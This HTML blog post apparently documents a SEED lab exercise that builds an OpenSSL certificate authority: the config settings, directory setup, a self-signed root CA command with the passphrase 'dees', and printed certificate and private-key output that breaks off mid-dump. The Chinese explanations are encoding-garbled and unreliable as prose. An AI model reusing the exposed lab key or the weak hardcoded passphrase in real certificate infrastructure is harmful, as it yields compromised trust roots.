class="hljs-keyword">with</span> same subject.<br>new_certs_dir   = $dir/newcerts         # default place for new certs.<br><br>certificate     = $dir/cacert.pem       # The CA certificate<br>serial          = $dir/serial           # The current serial number<br>crlnumber       = $dir/crlnumber        # the current crl number<br>                                        # must be commented out to leave a V1 CRL<br>crl             = $dir/crl.pem          # The current CRL<br>private_key     = $dir/private/cakey.pem# The private key<br><br>x509_extensions = usr_cert              # The extensions to add to the cert<br><br># Comment out the following two lines for the <span class="hljs-string">&quot;traditional&quot;</span><br># (and highly broken) format.<br>name_opt        = ca_default            # Subject Name options<br>cert_opt        = ca_default            # Certificate field options<br><br># Extension copying option: use <span class="hljs-keyword">with</span> caution.<br># copy_extensions = copy<br><br><br></code></pre></td></tr></table></figure><table><thead><tr><th>è®¾ç½®</th><th>å€¼</th><th>è§£é‡Š</th></tr></thead><tbody><tr><td>dir</td><td>./demoCA</td><td>æ‰€æœ‰æ–‡ä»¶å­˜æ”¾çš„æ ¹ç›®å½•</td></tr><tr><td>certs</td><td>$dir/certs</td><td>å­˜å‚¨å·²é¢å‘è¯ä¹¦çš„ç›®å½•</td></tr><tr><td>crl_dir</td><td>$dir/crl</td><td>å­˜å‚¨å·²é¢å‘CRLçš„ç›®å½•</td></tr><tr><td>database</td><td>$dir/index.txt</td><td>æ•°æ®åº“ç´¢å¼•æ–‡ä»¶</td></tr><tr><td>unique_subject</td><td>no</td><td>æ˜¯å¦å…è®¸åˆ›å»ºå…·æœ‰ç›¸åŒä¸»é¢˜çš„å¤šä¸ªè¯ä¹¦</td></tr><tr><td>new_certs_dir</td><td>$dir/newcerts</td><td>å­˜å‚¨æ–°åˆ›å»ºè¯ä¹¦çš„é»˜è®¤ç›®å½•</td></tr><tr><td>certificate</td><td>$dir/cacert.pem</td><td>CAè¯ä¹¦æ–‡ä»¶</td></tr><tr><td>serial</td><td>$dir/serial</td><td>å½“å‰åºåˆ—å·æ–‡ä»¶</td></tr><tr><td>crlnumber</td><td>$dir/crlnumber</td><td>å½“å‰CRLå·ç æ–‡ä»¶</td></tr><tr><td>crl</td><td>$dir/crl.pem</td><td>å½“å‰CRLæ–‡ä»¶</td></tr><tr><td>private_key</td><td>$dir/private/cakey.pem</td><td>ç§é’¥æ–‡ä»¶</td></tr><tr><td>x509_extensions</td><td>usr_cert</td><td>æ·»åŠ åˆ°è¯ä¹¦çš„æ‰©å±•</td></tr><tr><td>name_opt</td><td>ca_default</td><td>ä¸»é¢˜åç§°é€‰é¡¹</td></tr><tr><td>cert_opt</td><td>ca_default</td><td>è¯ä¹¦å­—æ®µé€‰é¡¹</td></tr><tr><td>copy_extensions</td><td>copy</td><td>å¤åˆ¶æ‰©å±•é€‰é¡¹ï¼ˆå½“å‰è¢«æ³¨é‡Šæ‰ï¼‰</td></tr></tbody></table><p>åœ¨å®¶ç›®å½•ä¸‹åˆ›å»ºå·¥ä½œç›®å½•CAï¼Œå°†openssl.cnfå¤åˆ¶åˆ°æ­¤å¤„ï¼Œåˆ é™¤æ–‡ä»¶ä¸­copy_extensions = copyå’Œunique_subject  = noçš„æ³¨é‡Š</p><p>å°†è¯¥æ–‡ä»¶å¤åˆ¶åˆ°å·¥ä½œç›®å½•ä¹‹åï¼Œéœ€è¦æŒ‰ç…§é…ç½®æ–‡ä»¶ä¸­æŒ‡å®šçš„æ–¹å¼åˆ›å»ºå‡ ä¸ªå­ç›®å½•ã€‚æˆ‘ä»¬éœ€è¦åˆ›å»ºå‡ ä¸ªå­ç›®å½•<code>mkdir certs crl newcerts</code></p><blockquote><p>å¯¹äº index.txt æ–‡ä»¶ï¼Œåªéœ€åˆ›å»ºä¸€ä¸ªç©ºæ–‡ä»¶ã€‚å¯¹äºserialæ–‡ä»¶ï¼Œåœ¨æ–‡ä»¶ä¸­æ”¾ç½®ä¸€ä¸ªå­—ç¬¦ä¸²æ ¼å¼çš„æ•°å­—(ä¾‹å¦‚1000)ã€‚ä¸€æ—¦è®¾ç½®äº†é…ç½®æ–‡ä»¶ openssl.cnfï¼Œå°±å¯ä»¥åˆ›å»ºå’Œé¢å‘è¯ä¹¦ã€‚</p></blockquote><p>åˆ›å»ºå‡ ä¸ªå¿…é¡»çš„æ–‡ä»¶</p><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs elixir">[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span> mkdir certs crl newcerts<br>[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span>ls<br>certs  crl  newcerts<br>[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span>echo <span class="hljs-number">1000</span> &gt; serial<br>[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span>echo <span class="hljs-string">&#x27;&#x27;</span> &gt; index.txt<br>[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span>ls<br>certs  crl  index.txt  newcerts  serial<br>[06/<span class="hljs-number">21</span>/<span class="hljs-number">23</span>]seed<span class="hljs-variable">@VM</span><span class="hljs-symbol">:~/demoCA</span><span class="hljs-variable">$ </span>ls<br>certs  crl  index.txt  newcerts  serial<br><br></code></pre></td></tr></table></figure><p>å¦‚å‰æ‰€è¿°ï¼Œæˆ‘ä»¬éœ€è¦ä¸º CA ç”Ÿæˆä¸€ä¸ªè‡ªç­¾åè¯ä¹¦ã€‚è¿™æ„å‘³ç€è¿™ä¸ª CA æ˜¯å®Œå…¨å¯ä¿¡çš„ï¼Œå®ƒçš„è¯ä¹¦å°†å……å½“æ ¹è¯ä¹¦ã€‚å¯ä»¥è¿è¡Œä»¥ä¸‹å‘½ä»¤ä¸º CA ç”Ÿæˆè‡ªç­¾åè¯ä¹¦:</p><p>åœ¨å‘½ä»¤è¡Œä¸­æŒ‡å®šä¸»é¢˜ä¿¡æ¯å’Œå¯†ç ï¼Œè¿™æ ·å°±ä¸ä¼šæç¤ºæ‚¨è¾“å…¥ä»»ä½•å…¶ä»–ä¿¡æ¯ã€‚åœ¨ä¸‹é¢çš„å‘½ä»¤ä¸­ï¼Œæˆ‘ä»¬ä½¿ç”¨-subj æ¥è®¾ç½®ä¸»é¢˜ä¿¡æ¯ï¼Œä½¿ç”¨-passout pass: dees æ¥è®¾ç½® dees çš„å¯†ç ã€‚</p><figure class="highlight vim"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs vim">openssl req -x509 -newkey rs<span class="hljs-variable">a:4096</span> -<span class="hljs-built_in">sha256</span> -days <span class="hljs-number">3650</span> \<br>-keyout <span class="hljs-keyword">ca</span>.key -out <span class="hljs-keyword">ca</span>.crt \<br>-subj <span class="hljs-string">&quot;/CN=www.modelCA.com/O=Model CA LTD./C=US&quot;</span> \<br>-passout pas<span class="hljs-variable">s:dees</span> \<br>-config ./my_openssl.<span class="hljs-keyword">cnf</span><br></code></pre></td></tr></table></figure><p>æ‰§è¡Œè¯¥å‘½ä»¤åï¼Œå°†ç”Ÿæˆä¸€ä¸ªåä¸º <code>ca.key</code> çš„ç§é’¥æ–‡ä»¶å’Œä¸€ä¸ªåä¸º <code>ca.crt</code> çš„è‡ªç­¾åæ ¹è¯ä¹¦æ–‡ä»¶ï¼Œå¯ä»¥å°†è¯¥æ ¹è¯ä¹¦ç”¨äºç­¾å‘å…¶ä»–è¯ä¹¦</p><ul><li><code>-x509</code>ï¼šæŒ‡å®šç”Ÿæˆè‡ªç­¾åçš„è¯ä¹¦ï¼Œè€Œæ— éœ€å…ˆç”Ÿæˆè¯ä¹¦è¯·æ±‚ï¼ˆCSRï¼‰</li><li><code>-newkey rsa:4096</code>ï¼šç”Ÿæˆä¸€ä¸ªæ–°çš„ RSA 4096 ä½çš„å¯†é’¥å¯¹ã€‚</li><li><code>-sha256</code>ï¼šä½¿ç”¨ SHA-256 ç®—æ³•è¿›è¡Œè¯ä¹¦å“ˆå¸Œã€‚</li><li><code>-days 3650</code>ï¼šè¯ä¹¦çš„æœ‰æ•ˆæœŸä¸º 3650 å¤©ï¼ˆçº¦ä¸º 10 å¹´ï¼‰ã€‚</li><li><code>-keyout ca.key</code>ï¼šå°†ç”Ÿæˆçš„ç§é’¥ä¿å­˜åˆ° <code>ca.key</code> æ–‡ä»¶ã€‚</li><li><code>-out ca.crt</code>ï¼šå°†ç”Ÿæˆçš„è¯ä¹¦ä¿å­˜åˆ° <code>ca.crt</code> æ–‡ä»¶ã€‚</li><li><code>-subj &quot;/CN=www.modelCA.com/O=Model CA LTD./C=US&quot;</code>ï¼šæŒ‡å®šè¯ä¹¦çš„ä¸»é¢˜ä¿¡æ¯ï¼ŒåŒ…æ‹¬é€šç”¨åç§°ï¼ˆCommon Nameï¼‰ã€ç»„ç»‡ï¼ˆOrganizationï¼‰å’Œå›½å®¶ä»£ç ï¼ˆCountry Codeï¼‰ã€‚</li><li><code>-passout pass:dees</code>ï¼šæŒ‡å®šç§é’¥çš„å¯†ç ä¸º â€œdeesâ€ã€‚</li><li>/path/to/your/openssl.cnf é…ç½®æ–‡ä»¶çš„è·¯å¾„</li></ul><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/22/23]seed@VM:~/demoCA$ openssl req -x509 -newkey rsa:4096 -sha256 -days 3650 \<br><span class="hljs-meta">&gt;</span><span class="bash"> -keyout ca.key -out ca.crt \</span><br><span class="bash">&gt; -subj <span class="hljs-string">&quot;/CN=www.modelCA.com/O=Model CA LTD./C=US&quot;</span> \</span><br><span class="bash">&gt; -passout pass:dees \</span><br><span class="bash">&gt; -config</span> <br>demoCA/          tmp_openssl.cnf  <br><span class="hljs-meta">&gt;</span><span class="bash"> -config ./tmp_openssl.cnf</span> <br>Generating a RSA private key<br>............................................................++++<br>................++++<br>writing new private key to &#x27;ca.key&#x27;<br>-----<br><br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å¯ä»¥ä½¿ç”¨ä»¥ä¸‹å‘½ä»¤æŸ¥çœ‹ X509è¯ä¹¦çš„è§£ç å†…å®¹å’Œ RSA å¯†é’¥(- text æ„å‘³ç€å°†å†…å®¹è§£ç ä¸ºçº¯æ–‡æœ¬;-noout æ„å‘³ç€ä¸æ‰“å°ç¼–ç ç‰ˆæœ¬)</p><figure class="highlight processing"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs processing">openssl x509 -in ca.crt -<span class="hljs-built_in">text</span> -noout<br>openssl rsa -in ca.<span class="hljs-built_in">key</span> -<span class="hljs-built_in">text</span> -noout<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/21/23]seed@VM:~/.../demoCA$ openssl x509 -in ca.crt -text -noout<br>Certificate:<br>    Data:<br>        Version: 3 (0x2)<br>        Serial Number:<br>            36:b9:8a:24:a2:ea:a6:49:b8:a0:53:22:31:68:75:f1:0f:31:34:69<br>        Signature Algorithm: sha256WithRSAEncryption<br>        Issuer: CN = www.modelCA.com, O = Model CA LTD., C = US<br>        Validity<br>            Not Before: Jun 22 03:45:53 2023 GMT<br>            Not After : Jun 19 03:45:53 2033 GMT<br>        Subject: CN = www.modelCA.com, O = Model CA LTD., C = US<br>        Subject Public Key Info:<br>            Public Key Algorithm: rsaEncryption<br>                RSA Public-Key: (4096 bit)<br>                Modulus:<br>                    00:eb:fb:ab:8d:c2:3b:65:a7:cd:9a:34:ae:6d:b9:<br>                    01:49:ff:cb:c5:7d:8f:b5:19:34:41:a7:3f:df:44:<br>                    56:25:65:ba:92:af:21:16:4b:1f:71:a3:27:1d:04:<br>                    8a:fc:b0:f3:01:47:e9:26:d2:ab:e7:62:36:ff:82:<br>                    6b:1a:a8:b3:03:1f:2c:97:a0:bc:d1:17:75:eb:b2:<br>                    12:f6:2b:94:a1:30:17:45:ab:40:e1:32:31:20:92:<br>                    27:f9:de:22:bf:32:8f:f0:bf:cb:93:b2:18:a7:75:<br>                    43:85:ca:cf:ff:75:48:79:e1:9a:19:43:e0:75:1a:<br>                    10:50:0b:52:6d:a7:0d:bf:a1:db:60:f9:50:82:78:<br>                    35:23:09:a7:12:ad:6b:78:78:e1:f8:d0:d6:ba:19:<br>                    f2:ee:fd:a5:5a:16:49:41:e6:f8:68:e5:84:6b:54:<br>                    ab:a9:ec:a9:22:2e:87:29:0d:62:51:a4:f6:80:49:<br>                    ca:36:4d:ab:ef:22:83:51:df:d7:5b:9c:14:40:4c:<br>                    75:42:85:92:ae:9a:4f:93:75:47:7b:e1:a7:09:35:<br>                    bb:b7:ea:08:2d:0f:e5:df:0d:23:86:9d:33:ef:f5:<br>                    f5:f4:52:60:4a:16:f0:34:80:bd:66:7a:46:6c:e2:<br>                    c5:10:11:ee:5e:44:14:00:74:ff:1c:57:70:bd:69:<br>                    f6:9f:ff:46:8c:48:4e:ea:5e:2c:33:67:fc:e4:ad:<br>                    c8:57:26:b1:ce:27:ed:4f:72:d3:d0:f7:12:6c:69:<br>                    ff:af:af:76:57:cb:2b:7e:96:88:12:34:8d:5e:f7:<br>                    2e:58:a3:96:4e:d5:98:13:ee:91:0c:12:45:97:a8:<br>                    e8:50:61:2a:c4:b0:ca:29:d5:5c:0c:4f:de:67:99:<br>                    c9:7c:2d:77:84:f4:41:44:61:5e:99:69:21:fe:7e:<br>                    e8:0f:06:2a:24:e7:ed:e4:17:37:40:d1:2f:53:99:<br>                    c3:65:b6:91:a4:3d:86:d9:b3:9c:4b:af:b3:b8:56:<br>                    c4:d8:83:8c:5b:16:c9:c2:89:de:55:8f:4e:6c:eb:<br>                    f2:8e:6d:2e:00:7f:6c:9e:f9:6b:63:cc:58:fe:af:<br>                    6d:33:31:02:8c:5f:6b:d1:1f:2f:f5:79:67:8d:d2:<br>                    20:33:fc:8e:f7:1c:c5:67:49:bc:bd:c7:e3:c6:e3:<br>                    ec:52:0c:75:34:f0:1f:2b:15:14:21:8c:91:87:1a:<br>                    0f:1a:90:f8:16:9b:ed:8e:da:49:ba:33:03:82:6e:<br>                    ff:c1:cd:6d:c0:b5:4b:42:99:e9:e2:4f:fb:e3:55:<br>                    30:6e:0d:6e:7d:9c:cb:94:3e:8e:65:60:76:9a:01:<br>                    24:81:b1:72:61:b3:bc:3e:f2:3b:52:d5:24:29:e3:<br>                    9f:47:1b<br>                Exponent: 65537 (0x10001)<br>        X509v3 extensions:<br>            X509v3 Subject Key Identifier: <br>                AA:E0:4C:38:F1:86:1C:61:27:D8:D4:35:85:21:CB:AF:5F:01:07:71<br>            X509v3 Authority Key Identifier: <br>                keyid:AA:E0:4C:38:F1:86:1C:61:27:D8:D4:35:85:21:CB:AF:5F:01:07:71<br><br>            X509v3 Basic Constraints: <br>                CA:TRUE<br>    Signature Algorithm: sha256WithRSAEncryption<br>         03:c1:de:ef:e1:a4:22:3d:53:5f:5c:9d:ca:4f:80:14:7e:f3:<br>         e4:11:83:57:85:03:13:86:87:e0:20:39:d8:67:5f:c2:56:3c:<br>         a3:b0:4a:86:ab:34:21:df:71:8d:32:93:aa:a4:9e:99:36:64:<br>         ea:d7:13:c7:a4:da:2e:80:31:de:be:ff:64:c4:a0:7a:50:ec:<br>         7d:79:2b:07:ea:33:a0:f8:96:c4:c9:d7:cc:02:53:ac:43:22:<br>         ec:7d:33:eb:0d:86:4d:eb:17:c5:d4:cb:65:23:38:ef:6f:a7:<br>         dd:a2:2f:28:22:b6:2f:a3:56:28:18:69:1b:04:07:0b:06:2a:<br>         58:6c:96:ba:66:d0:0b:b6:8c:58:7b:8d:82:a6:82:fd:9c:ff:<br>         a3:08:1a:50:53:d0:4e:f8:5d:18:8f:af:0c:b7:7f:78:34:e9:<br>         7f:79:4c:8b:62:9d:86:b3:a2:4f:3c:f4:aa:47:b5:72:9d:7c:<br>         14:fc:be:28:97:3e:b7:cb:7e:19:55:8f:ea:d9:53:b1:e5:67:<br>         70:09:a7:51:3e:56:e7:d7:43:98:ae:c5:8f:81:92:e5:46:49:<br>         a9:95:7b:dd:56:5a:f6:97:ed:41:bb:5b:85:9d:56:06:3a:ac:<br>         47:1b:16:c6:c3:fc:5d:c5:b4:ef:74:bf:68:90:17:11:34:07:<br>         6d:f8:d8:63:f1:7e:3e:63:03:4d:59:86:5a:3b:32:1b:aa:58:<br>         df:9d:ee:81:3b:a0:d0:2b:d5:6b:65:0e:05:26:e8:4b:a8:c5:<br>         f8:57:64:d7:36:5c:20:43:aa:21:1d:f1:2e:cb:e8:d1:f4:8a:<br>         2c:51:53:1f:3e:3e:29:ca:bc:f7:dd:cd:86:ff:72:93:73:22:<br>         e9:48:7e:ca:00:92:85:20:e4:e3:06:3d:cb:42:b4:eb:be:85:<br>         80:d9:d0:ec:59:6c:1e:c7:0a:d0:00:a5:71:07:5e:e7:c6:9b:<br>         48:42:af:0d:21:bb:1e:87:50:89:ba:5f:cc:3b:a5:59:f1:49:<br>         ec:64:85:ce:42:f9:1a:f4:52:ff:e9:92:83:64:24:c7:57:4a:<br>         85:bc:b9:71:1d:4a:9b:3c:c9:b9:29:01:3f:eb:4c:9f:c1:4b:<br>         d7:8b:da:a1:1b:ba:80:dd:19:62:1b:fb:4f:6d:4f:2a:20:ff:<br>         ee:f6:11:4d:11:c1:1b:3f:af:82:d3:19:93:82:d8:c6:5c:9c:<br>         d3:38:58:5a:3f:4d:8d:c5:23:3c:87:fc:bc:b0:86:8c:d5:5f:<br>         ed:3d:be:26:22:b7:a9:6e:e5:d8:00:49:7c:35:5d:1d:96:b2:<br>         7e:59:bd:61:17:24:ff:fa:3c:f5:78:bd:1f:a0:7f:b5:4a:02:<br>         2c:d8:44:37:4c:6d:4b:b0<br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br></pre></td><td class="code"><pre><code class="hljs shell">[06/21/23]seed@VM:~/.../demoCA$ openssl rsa -in ca.key -text -noout<br>Enter pass phrase for ca.key:<br>RSA Private-Key: (4096 bit, 2 primes)<br>modulus:<br>    00:eb:fb:ab:8d:c2:3b:65:a7:cd:9a:34:ae:6d:b9:<br>    01:49:ff:cb:c5:7d:8f:b5:19:34:41:a7:3f:df:44:<br>    56:25:65:ba:92:af:21:16:4b:1f:71:a3:27:1d:04:<br>    8a:fc:b0:f3:01:47:e9:26:d2:ab:e7:62:36:ff:82:<br>    6b:1a:a8:b3:03:1f:2c:97:a0:bc:d1:17:75:eb:b2:<br>    12:f6:2b:94:a1:30:17:45:ab:40:e1:32:31:20:92:<br>    27:f9:de:22:bf:32:8f:f0:bf:cb:93:b2:18:a7:75:<br>    43:85:ca:cf:ff:75:48:79:e1:9a:19:43:e0:75:1a:<br>    10:50:0b:52:6d:a7:0d:bf:a1:db:60:f9:50:82:78:<br>    35:23:09:a7:12:ad:6b:78:78:e1:f8:d0:d6:ba:19:<br>    f2:ee:fd:a5:5a:16:49:41:e6:f8:68:e5:84:6b:54:<br>    ab:a9:ec:a9:22:2e:87:29:0d:62:51:a4:f6:80:49:<br>    ca:36:4d:ab:ef:22:83:51:df:d7:5b:9c:14:40:4c:<br>    75:42:85:92:ae:9a:4f:93:75:47:7b:e1:a7:09:35:<br>    bb:b7:ea:08:2d:0f:e5:df:0d:23:86:9d:33:ef:f5:<br>    f5:f4:52:60:4a:16:f0:34:80:bd:66:7a:46:6c:e2:<br>    c5:10:11:ee:5e:44:14:00:74:ff:1c:57:70:bd:69:<br>    f6:9f:ff:46:8c:48:4e:ea:5e:2c:33:67:fc:e4:ad:<br>    c8:57:26:b1:ce:27:ed:4f:72:d3:d0:f7:12:6c:69:<br>    ff:af:af:76:57:cb:2b:7e:96:88:12:34:8d:5e:f7:<br>    2e:58:a3:96:4e:d5:98:13:ee:91:0c:12:45:97:a8:<br>    e8:50:61:2a:c4:b0:ca:29:d5:5c:0c:4f:de:67:99:<br>    c9:7c:2d:77:84:f4:41:44:61:5e:99:69:21:fe:7e:<br>    e8:0f:06:2a:24:e7:ed:e4:17:37:40:d1:2f:53:99:<br>    c3:65:b6:91:a4:3d:86:d9:b3:9c:4b:af:b3:b8:56:<br>    c4:d8:83:8c:5b:16:c9:c2:89:de:55:8f:4e:6c:eb:<br>    f2:8e:6d:2e:00:7f:6c:9e:f9:6b:63:cc:58:fe:af:<br>    6d:33:31:02:8c:5f:6b:d1:1f:2f:f5:79:67:8d:d2:<br>    20:33:fc:8e:f7:1c:c5:67:49:bc:bd:c7:e3:c6:e3:<br>    ec:52:0c:75:34:f0:1f:2b:15:14:21:8c:91:87:1a:<br>    0f:1a:90:f8:16:9b:ed:8e:da:49:ba:33:03:82:6e:<br>    ff:c1:cd:6d:c0:b5:4b:42:99:e9:e2:4f:fb:e3:55:<br>    30:6e:0d:6e:7d:9c:cb:94:3e:8e:65:60:76:9a:01:<br>    24:81:b1:72:61:b3:bc:3e:f2:3b:52:d5:24:29:e3:<br>    9f:47:1b<br>publicExponent: 65537 (0x10001)<br>privateExponent:<br>    5d:f2:8c:c2:db:ff:df:a1:a5:85:ed:d1:3f:97:76:<br>    be:ea:1a:4a:de:89:16:d5:18:eb:c6:54:f4:62:f5:<br>    54:e0:22:1e:01:a0:cf:8a:4a:d3:67:db:cb:7e:a2:<br>    82:a5:43:a9:4f:e2:af:75:11:c1:05:65:d5:e5:2b:<br>    14:aa:f2:d1:9c:58:99:69:01:a2:d0:8f:3e:ad:5f:<br>    45:27:e6:7d:21:73:32:66:52:67:15:1f:5f:d3:30:<br>    1d:16:e5:88:6e:ed:c5:2f:e6:31:3f:a6:f7:0c:05:<br>    3c:bf:98:7d:20:49:21:54:c2:8f:aa:69:32:d5:94:<br>    86:f9:6a:f0:82:a0:43:99:81:88:22:d9:7d:87:b3:<br>    c7:e6:30:e0:8b:b0:0c:7f:3b:9f:5e:2d:0e:5c:04:<br>    4e:47:26:cc:2d:b1:2e:8e:70:78:fa:5e:f4:87:f9:<br>    eb:a5:6f:54:4f:67:b9:dd:3d:36:39:d1:75:13:6b:<br>    70:a1:0d:81:1f:a1:5e:38:1a:39:bb:72:88:82:a7:<br>    f0:3a:d3:41:b5:e7:56:52:4b:8a:33:34:d7:c2:cf:<br>    a0:11:88:fd:bf:a5:89:5e:66:b5:51:e2:7a:76:d6:<br>    5b:55:6c:46:32:c9:a0:6d:5c:79:ee:d6:18:c5:53:<br>    24:e9:ae:97:52:cd:0f:bd:84:4e:d9:34:e6:03:c8:<br>    8d:f8:31:0c:52:b8:38:73:f3:62:74:e2:38:72:cb:<br>    fe:00:7a:47:8e:a0:6a:8e:1a:57:1d:d6:40:2b:54:<br>    2f:e8:d3:2d:be:d0:e4:3e:f4:ed:c8:2a:df:af:b7:<br>    a0:47:75:fe:8d:19:13:4f:30:d9:23:d1:86:9a:9f:<br>    d5:db:45:43:9f:fb:fa:c6:f3:2b:44:02:98:f6:e8:<br>    a8:12:af:c1:c0:9d:24:53:72:c6:29:ac:b0:4f:9c:<br>    